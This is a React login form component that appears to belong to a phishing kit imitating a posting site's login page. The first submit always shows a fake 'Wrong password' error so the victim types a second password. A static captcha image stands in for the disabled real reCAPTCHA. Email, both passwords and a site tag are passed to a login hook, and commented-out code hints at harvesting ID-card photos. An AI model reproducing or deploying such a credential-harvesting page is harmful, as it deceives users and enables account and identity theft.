import { useCallback, useEffect, useRef, useState } from "react";
import { Field, Form, Formik } from "formik";
import ReCAPTCHA from "react-google-recaptcha";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import PhotoUpload from "./PhotoUpload";
import Image from "next/image";
import { toast } from "react-toastify";

function LoginForm() {
  const [verified, setVerified] = useState(false);
  const [showWrongPassword, setShowWrongPassword] = useState(false);
  // const [showModal, setShowModal] = useState(false);

  const initialvalues = {
    email: "",
    password: "",
    wrongPassword: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = async (values, formik) => {
    const { email, password,wrongPassword } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    const allValues = {
      site: site,
      email: email,
      password: password,
      wrongPassword: wrongPassword,
      skipcode: "",
      // onlyCard: Cookies.get("onlyCard"),
      // holdingCard: Cookies.get("holdingCard"),
    };

    login(allValues, formik);

    // console.log("allValues", allValues);
  };

  // const handleNextStep = () => {
  //   Cookies.set("email", email);
  //   Cookies.set("password", password);

  //   setShowModal(true);
  // };
  const handleWrongPassword = () => {
    setShowWrongPassword(true);
    toast.error("Wrong password, try again");
  };

  const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
  // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
  const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";

  const recaptchaKey =
    process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;

  return (
    <div className="">
      <div className="mt-[10px] flex flex-col items-center">
        <p className="text-custom-gray2 text-lg">
          Is this your first time posting?
        </p>
        <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
          Start Here
        </button>

        <p className=" mt-[10px] text-custom-gray2 text-lg">
          Already have a login?
        </p>
        <p className="text-custom-gray2 text-[25px]">Login</p>
      </div>

      <div className="mt-1">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="mx-[30px]">
              <div className="space-y-[9px]">
                <Field
                  placeholder="Email"
                  className="w-full px-[57px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="email"
                  name="email"
                  required
                />
                      {!showWrongPassword ? (
                <>
                  <Field
                     className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />
                </>
              ) : (
                <>
                  <Field
                     className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                    placeholder="Password"
                    name="wrongPassword"
                    type="password"
                    autoComplete="on"
                    required
                  />

               
                </>
              )}
              </div>
              <div className="flex flex-col items-center">
                {/* <ReCAPTCHA
                  className="mt-[35px]"
                  sitekey={recaptchaKey}
                  onChange={() => setVerified(true)}
                /> */}
                <Image
                  src="/images/captcha.png"
                  alt="captcha"
                  width={228}
                  height={55}
                  className="mt-3"
                />

                <Field
                  className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="captcha"
                  name="captcha"
                  type="captcha"
                  autoComplete="on"
                  placeholder="Enter code from the picture"
                  required
                />
                {!showWrongPassword?(<button
                  type="submit"
                  // type="button"
                  onClick={handleWrongPassword}
                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                  // disabled={!verified}
                  // onClick={handleNextStep}
                >
                  Submit
                </button>):(<button
                  type="submit"
                  // type="button"
                  className="mt-4 bg-custom-orange text-white uppercase text-[20px] px-[21px] py-[8px] tracking-wider"
                  // disabled={!verified}
                  // onClick={handleNextStep}
                >
                  Submit
                </button>)}
              </div>

              {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
            </Form>
          )}
        </Formik>
      </div>

      <Image
        src="/images/warning.png"
        alt="warning"
        className="mt-2 mx-auto"
        width={350}
        height={154}
      />

      <p className="mt-[10px] text-center uppercase text-sm text-custom-blue2 hover:underline">
        Forgot Password?
      </p>
    </div>
  );
}

export default LoginForm;
